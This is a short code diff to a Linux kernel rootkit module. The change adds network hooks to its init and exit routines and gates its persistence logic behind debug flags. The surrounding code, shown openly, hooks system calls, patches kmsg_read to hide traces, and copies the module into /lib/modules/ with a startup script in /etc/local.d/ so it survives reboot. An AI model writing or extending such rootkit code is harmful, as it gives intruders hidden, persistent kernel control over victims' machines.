@@ -2,6 +2,7 @@
 
 #include "constants.h"
 #include "hooking.h"
+#include "net.h"
 #include "syscall_hooks.h"
 #include "utils.h"
 #include <linux/init.h>
@@ -37,6 +38,11 @@ static int __init rootkit_init(void)
 
     hook_syscalls(P_SYSCALL_HOOKS);
 
+    init_nethooks();
+
+#ifndef DEBUG /* Do not copy module if it is in debug mode */
+#ifndef NOPERSIST
+    // Setup persistence (copy module file to /lib/modules/ and create startup script in /etc/local.d/)
     i32_err = copy_module_file();
     IF_U (i32_err != 0) {
         pr_dev_err("Failed to copy module file\n");
@@ -47,6 +53,8 @@ static int __init rootkit_init(void)
             pr_dev_err("Failed to create /etc/local.d/ file\n");
         }
     }
+#endif
+#endif
 
     pr_dev_info("Module loaded\n");
     return 0;
@@ -65,6 +73,9 @@ static __exit void rootkit_exit(void)
 
     // Restore the original `kmsg_read()` function
     restore_kmsg_read();
+
+    // Cleanup network hooks
+    cleanup_nethooks();
 
     pr_dev_info("Module unloaded\n");
     return;
